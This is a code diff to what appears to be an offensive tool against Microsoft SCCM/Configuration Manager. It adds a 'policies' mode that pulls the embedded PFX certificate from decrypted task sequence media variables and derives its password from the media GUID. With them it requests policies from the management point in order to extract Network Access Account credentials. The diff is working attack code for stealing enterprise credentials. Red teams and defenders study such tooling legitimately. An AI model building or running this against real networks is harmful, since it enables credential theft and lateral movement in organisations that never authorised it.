@@ -1,6 +1,8 @@
 from lib import sccm
 from lib import socks, tftp
+from lib.policy import PolicyRetriever
 import argparse
+import binascii
 import os
 
 # Parse arguments
@@ -27,6 +29,12 @@ loot_parser = subparsers.add_parser("loot", help="Extract PFX cert and info from
 loot_parser.add_argument("xml_file", help="Path to decrypted media variables XML file")
 loot_parser.add_argument("-o", "--output", help="Output directory for loot files", type=str, default="./loot")
 
+# Policies mode — retrieve and decrypt policies from MP using PFX cert
+policies_parser = subparsers.add_parser("policies", help="Retrieve policies from MP using PFX cert (extracts NAA creds)")
+policies_parser.add_argument("xml_file", help="Path to decrypted media variables XML or loot_summary.txt")
+policies_parser.add_argument("-o", "--output", help="Output directory for policy files", type=str, default="./loot")
+policies_parser.add_argument("--mp", help="Override management point URL", type=str, default=None)
+
 args = parser.parse_args()
 
 # For backwards compatibility: if no subcommand, treat positional args as attack mode
@@ -45,6 +53,30 @@ def handle_decrypted_xml(sccm_client, decrypted_xml, output_dir):
     """Extract PFX cert and key info from decrypted media variables."""
     print("[*] Extracting loot from decrypted media variables...")
     sccm_client.extract_media_variables(decrypted_xml, output_dir)
+
+if args.mode == "policies":
+    # Retrieve policies from MP using PFX from decrypted XML
+    import xml.etree.ElementTree as ET
+
+    with open(args.xml_file, "r") as f:
+        xml_text = f.read()
+
+    root = ET.fromstring(xml_text.encode("utf-16-le"))
+    mp_url = args.mp or root.find('.//var[@name="SMSTSMP"]').text
+    site_code = root.find('.//var[@name="_SMSTSSiteCode"]').text
+    media_guid = root.find('.//var[@name="_SMSMediaGuid"]').text
+    pfx_hex = root.find('.//var[@name="_SMSTSMediaPFX"]').text
+    pfx_bytes = bytes.fromhex(pfx_hex)
+    pfx_password = media_guid[:31]
+
+    print(f"[*] Management Point: {mp_url}")
+    print(f"[*] Site Code: {site_code}")
+    print(f"[*] Media GUID: {media_guid}")
+    print(f"[*] PFX Password: {pfx_password}")
+
+    retriever = PolicyRetriever(mp_url, site_code, pfx_bytes, pfx_password)
+    retriever.retrieve_policies(media_guid, args.output)
+    exit()
 
 if args.mode == "loot":
     # Extract from already-decrypted XML
